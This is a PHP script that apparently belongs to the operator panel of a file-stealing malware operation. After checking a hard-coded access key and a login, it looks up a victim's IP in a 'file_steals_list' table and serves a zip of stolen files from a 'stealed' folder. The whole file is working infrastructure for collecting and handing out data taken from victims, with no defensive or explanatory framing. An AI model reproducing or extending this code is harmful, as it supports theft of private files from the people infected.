<?php
header('Content-Type: application/octet-stream');
include('../class/include.php');
if($_GET['ip'] == 0 || $_GET['ik'] != 45133722 || !Account::isAuthentified()){
    die("Il y a rien ici mec desol");
}

$ipl = $GLOBALS['DB']->GetContent('file_steals_list', ['id' => $_GET['ip']])[0]['ip'];

header('Content-Type: application/zip');
header('Content-disposition: attachment; filename='."../../beta/core/stealed/".$ipl."filesteal.zip");
header('Content-Length: ' . filesize("../../beta/core/stealed/".$ipl."filesteal.zip"));
readfile("../../beta/core/stealed/".$ipl."filesteal.zip");
?>
